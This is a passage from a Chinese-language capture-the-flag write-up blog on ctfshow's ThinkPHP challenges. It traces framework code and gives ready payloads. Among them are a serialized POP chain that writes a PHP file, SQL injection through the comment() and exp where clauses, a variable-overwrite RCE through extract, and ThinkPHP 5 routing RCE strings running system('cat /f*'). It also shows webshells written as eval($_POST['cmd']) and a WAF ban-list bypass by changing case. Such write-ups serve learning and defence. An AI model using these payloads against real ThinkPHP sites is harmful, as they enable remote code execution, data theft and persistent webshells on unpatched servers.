                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               <span class="token delimiter important">?></span></span>" into outfile "/var/www/html/a.php"# ',
                "where" => "1=1"
            );
        &#125;
    &#125;
&#125;

namespace Think\Db\Driver &#123;
    class Mysql
    &#123;
        protected $config = array(
            "debug"    => 1,
            "database" => "ctfshow",
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
    &#125;
&#125;

namespace &#123;
    $a = new Think\Image\Driver\Imagick();
    echo base64_encode(serialize($a));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240306011302716.png" alt="image-20240306011302716"></p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240306011243648.png" alt="image-20240306011243648"></p>
<hr>
<h1 id="web576（comment注释注入）"><a href="#web576（comment注释注入）" class="headerlink" title="web576（comment注释注入）"></a>web576（comment注释注入）</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">comment</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注入点 id 包了一层<code>intval</code>，所以前面sql注入的方法用不了了</p>
<p>接下来重点看一下<code>comment</code>函数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 查询注释
 * @access public
 * @param string $comment 注释
 * @return Model
 */</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">comment</span><span class="token punctuation">(</span><span class="token variable">$comment</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$comment</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下断点调试，一路跟踪到 ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Db&#x2F;Driver.class.php:789 的<code>parseComment</code></p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240307171950786.png" alt="image-20240307171950786"></p>
<p>这里会对<code>$comment</code>的内容用<code>/**/</code>包裹</p>
<p>即接下来的sql语句为</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token identifier"><span class="token punctuation">`</span>think_user<span class="token punctuation">`</span></span> <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span>   <span class="token comment">/* 1' */</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么注入就很简单了，用<code>*/</code>闭合即可，然后写shell</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">*</span><span class="token operator">/</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/var/www/html/a.php"</span> <span class="token keyword">lines</span> <span class="token keyword">terminated</span> <span class="token keyword">by</span> <span class="token string">"&lt;?php eval($_POST[1]);?>"</span> <span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="web577（exp注入）"><a href="#web577（exp注入）" class="headerlink" title="web577（exp注入）"></a>web577（exp注入）</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$map</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
<span class="token string single-quoted-string">'id'</span><span class="token operator">=></span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>和web574相比，多了个把 id 处理成 map 数组的操作</p>
<p>本地下个断点调试一下</p>
<p>一路f10跟进到<code>where</code>函数这里</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240307185656317.png" alt="image-20240307185656317"></p>
<p>可以看到这里会把传入的值赋给<code>$this-&gt;options[&#39;where&#39;]</code></p>
<p>往下一直走到<code>_parseOptions</code>函数，当经过标注的这个for循环后val被赋值了<code>options[&#39;where&#39;]</code>的值。</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240307190300947.png" alt="image-20240307190300947"></p>
<p>继续，来到<code>parseWhere</code>的<code>parseWhereItem</code></p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240307190551612.png" alt="image-20240307190551612"></p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240307191144004.png" alt="image-20240307191144004"></p>
<p>观察代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(eq|neq|gt|egt|lt|elt)$/'</span><span class="token punctuation">,</span> <span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// 比较运算</span>
                    <span class="token variable">$whereStr</span> <span class="token operator">.=</span> <span class="token variable">$key</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exp</span><span class="token punctuation">[</span><span class="token variable">$exp</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseValue</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(notlike|like)$/'</span><span class="token punctuation">,</span> <span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// 模糊查找</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$likeLogic</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'OR'</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$likeLogic</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AND'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'OR'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'XOR'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            <span class="token variable">$like</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token variable">$like</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$key</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exp</span><span class="token punctuation">[</span><span class="token variable">$exp</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseValue</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                            <span class="token variable">$whereStr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'('</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$likeLogic</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token variable">$like</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')'</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$whereStr</span> <span class="token operator">.=</span> <span class="token variable">$key</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exp</span><span class="token punctuation">[</span><span class="token variable">$exp</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseValue</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'bind'</span> <span class="token operator">==</span> <span class="token variable">$exp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// 使用表达式</span>
                    <span class="token variable">$whereStr</span> <span class="token operator">.=</span> <span class="token variable">$key</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' = :'</span> <span class="token operator">.</span> <span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'exp'</span> <span class="token operator">==</span> <span class="token variable">$exp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// 使用表达式</span>
                    <span class="token variable">$whereStr</span> <span class="token operator">.=</span> <span class="token variable">$key</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$val</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现当<code>$val</code>是数组时，<code>$val[0]</code>赋值给了<code>$exp</code></p>
<p>如果<code>$exp</code>是字符串<code>exp</code>，最后返回的内容是<code>$whereStr .= $key.&#39; &#39;.$val[1];</code>也就是字符串<code>id</code>拼接上<code>$val[1]</code></p>
<p>那么<code>$val</code>是怎么来的呢，在<code>_parseOptions</code>函数中，当经过标注的这个for循环后val被赋值了<code>options[&#39;where&#39;]</code>的值。其实归根结底是赋值的我们传入的id的值</p>
<p>所以我们只需要传入<code>?id[0]=exp</code>就可以进入<code>$whereStr .= $key.&#39; &#39;.$val[1];</code>，接下来我们就可以在<code>$val[1]</code>这里注入sql语句，得到的<code>$whereStr</code>绕过了<code>parseValue</code>的转义</p>
<p>即我们传入的<code>id[1]=xxx</code>会被放到sql语句中</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>exp<span class="token operator">&amp;</span>id<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">?</span>id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>exp<span class="token operator">&amp;</span>id<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> from information_schema<span class="token operator">.</span>columns where table_name<span class="token operator">=</span><span class="token string single-quoted-string">'flags'</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">?</span>id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>exp<span class="token operator">&amp;</span>id<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span> union select <span class="token number">1</span><span class="token punctuation">,</span>flag4s<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> from flags<span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web578（变量覆盖导致rce）"><a href="#web578（变量覆盖导致rce）" class="headerlink" title="web578（变量覆盖导致rce）"></a>web578（<strong>变量覆盖导致rce</strong>）</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$from</span><span class="token operator">=</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>本地下断点调试，传入个<code>?name=a&amp;from=b</code>看看</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240307193608942.png" alt="image-20240307193608942"></p>
<p>跟进第一个函数assign，作用就是一个简单的赋值，传入的<code>?name=a&amp;from=b</code>会产生<code>$this-&gt;tVar=array(&#39;a&#39;=&gt;&#39;b&#39;)</code>，如果我们传入<code>?name[x]=y</code>，那么就是<code>$this-&gt;tVar=array(&#39;x&#39;=&gt;&#39;y&#39;)</code></p>
<p>接下来看display，跟进fetch</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240307193908061.png" alt="image-20240307193908061"></p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20240307193941494.png" alt="image-20240307193941494"></p>
<p>一眼发现在默认模板引擎为php的情况下，有 extract 函数对<code>$this-&gt;tVar</code>进行操作分解为独立变量，即假设<code>$this-&gt;tVar=array(&#39;a&#39;=&gt;&#39;b&#39;)</code>，那么经过这个函数就会生成<code>$a</code>，值为b</p>
<p>接下来是判断<code>$_content</code>不为空则执行eval函数，所以我们可以利用 extract 函数变量覆盖掉<code>$_content</code>来执行php代码</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">?name[_content]=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="TP5"><a href="#TP5" class="headerlink" title="TP5"></a>TP5</h1><p>漏洞分析的文章依旧在隔壁</p>
<p>web579-610均为未开启强制路由RCE</p>
<h1 id="web579（未开启强制路由RCE）"><a href="#web579（未开启强制路由RCE）" class="headerlink" title="web579（未开启强制路由RCE）"></a>web579（未开启强制路由RCE）</h1><p>tp版本是5.0.15</p>
<p>直接打payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>cat <span class="token operator">/</span>f<span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="web604"><a href="#web604" class="headerlink" title="web604"></a>web604</h1><p>tp版本5.1.29</p>
<p>payload一把梭了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Request<span class="token operator">/</span>input<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>data<span class="token operator">=</span>cat <span class="token operator">/</span>f<span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="web605"><a href="#web605" class="headerlink" title="web605"></a>web605</h1><p>ban了input，invokefunction</p>
<p>可以直接写马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">cmd</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"cat /f*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>命令执行用grep找一下发现waf位置在 ..&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;route&#x2F;dispatch&#x2F;Module.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 
 * 检查payload是否符合预期
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkPayload</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ban</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invokefunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'display'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$ban</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">.</span><span class="token string single-quoted-string">' 这条路子不通，想想其他路子~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>exec</code>方法中添加了<code>self::checkPayload($action);</code></p>
<hr>
<h1 id="web606"><a href="#web606" class="headerlink" title="web606"></a>web606</h1><p>又多ban了个write</p>
<p>但是考虑到 linux 环境下无视大小写，可以直接大写 WRITE 绕过</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">?s=index/\think\template\driver\file/Write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>另一个通杀payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">?s=index/\think\view\driver\Think/__call&amp;method=display&amp;params[]=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>该payload会生成shell拼接到$content进行write写入缓存文件，接着会include模板缓存文件</p>
<hr>
<h1 id="web607"><a href="#web607" class="headerlink" title="web607"></a>web607</h1><p>上一题payload就可以打穿了</p>
<p>看看waf</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 
 * 检查payload是否符合预期
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkPayload</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ban</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invokefunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'write'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'invokeFunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'display'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Load'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$ban</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">.</span><span class="token string single-quoted-string">' 这条路子不通，想想其他路子~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web608"><a href="#web608" class="headerlink" title="web608"></a>web608</h1><p>上题payload秒了</p>
<p>waf：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 
 * 检查payload是否符合预期
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkPayload</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ban</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invokefunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'write'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'invokeFunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'display'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Load'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span><span class="token variable">$ban</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">.</span><span class="token string single-quoted-string">' 这条路子不通，想想其他路子~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h1 id="web609"><a href="#web609" class="headerlink" title="web609"></a>web609</h1><p>上题payload秒了</p>
<p>waf：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * 
 * 检查payload是否符合预期
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkPayload</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ban</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'invokefunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'write'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'invokeFunction'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'param'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'display'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Load'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
